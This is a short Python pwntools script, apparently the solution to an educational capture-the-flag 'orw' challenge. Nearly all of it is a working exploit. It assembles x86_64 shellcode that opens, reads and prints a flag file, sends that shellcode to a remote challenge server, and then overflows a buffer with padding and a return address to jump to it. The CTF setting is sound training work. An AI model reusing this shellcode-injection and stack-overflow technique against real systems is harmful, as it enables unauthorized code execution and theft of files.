from pwn import *
import struct

'''
# check shell code concept
path = '/home/orw/flag'
segment = ''
for i in path:
    segment += i
    if len(segment) % 8 == 0:
        segment = segment[::-1]
        for j in segment:
            print(hex(ord(j)), end='')

        print('')
        segment = ''
'''
context.clear(arch='x86_64')

# shlelcode
shellcode = asm('''
    mov rax, 0x67616c662f77
    push rax
    mov rax, 0x726f2f656d6f682f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    mov rax, 0
    syscall

    mov rdi, 1
    mov rax, 1
    syscall
        ''')

# send remote process
r = remote('edu-ctf.csie.org', 10171)
r.sendlineafter('>', shellcode)
r.sendlineafter(':)', 'a' * 0x18 + p64(0x6010a0))
r.interactive()
